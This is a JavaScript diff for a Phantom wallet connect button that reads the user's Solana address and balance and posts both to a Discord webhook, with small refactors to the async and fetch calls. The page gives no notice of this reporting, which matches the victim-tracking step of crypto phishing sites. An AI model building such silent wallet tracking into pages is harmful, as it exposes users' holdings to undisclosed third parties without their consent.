@@ -8,7 +8,7 @@ function connectWallet() {
 
   (async () => {
     try {
-      wallet = await window.solana.connect({ onlyIfTrusted: false });
+      wallet = await window.solana.connect();
 
       if (!wallet || !wallet.publicKey) {
         document.getElementById("status_p").innerText = "❌ Connection rejected by user.";
@@ -17,18 +17,18 @@ function connectWallet() {
 
       const walletAddress = wallet.publicKey.toString();
       const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+
       const balanceLamports = await connection.getBalance(wallet.publicKey);
       const solBalance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
 
-      // Successfully connected and fetched balance
       document.getElementById("connect_button").innerText = "Connected ✅";
       document.getElementById("status_p").innerText =
         "Wallet: " + ellipsizeAddress(walletAddress) + " | Balance: " + solBalance.toFixed(4) + " SOL";
 
-      sendToDiscord(walletAddress, solBalance);
+      await sendToDiscord(walletAddress, solBalance);
 
     } catch (err) {
-      // Only trigger this if it's a real error (other than user rejection)
+      // Fallback only if nothing works
       document.getElementById("status_p").innerText = "❌ Something went wrong.";
     }
   })();
@@ -43,21 +43,15 @@ function sendToDiscord(address, balance) {
         title: "🟣 Phantom Wallet Connected",
         color: 0x8000ff,
         fields: [
-          {
-            name: "Wallet Address",
-            value: `\`${address}\``
-          },
-          {
-            name: "Balance",
-            value: `\`${balance.toFixed(4)} SOL\``
-          }
+          { name: "Wallet Address", value: `\`${address}\`` },
+          { name: "Balance", value: `\`${balance.toFixed(4)} SOL\`` }
         ],
         timestamp: new Date().toISOString()
       }
     ]
   };
 
-  fetch(webhookUrl, {
+  return fetch(webhookUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(embed)
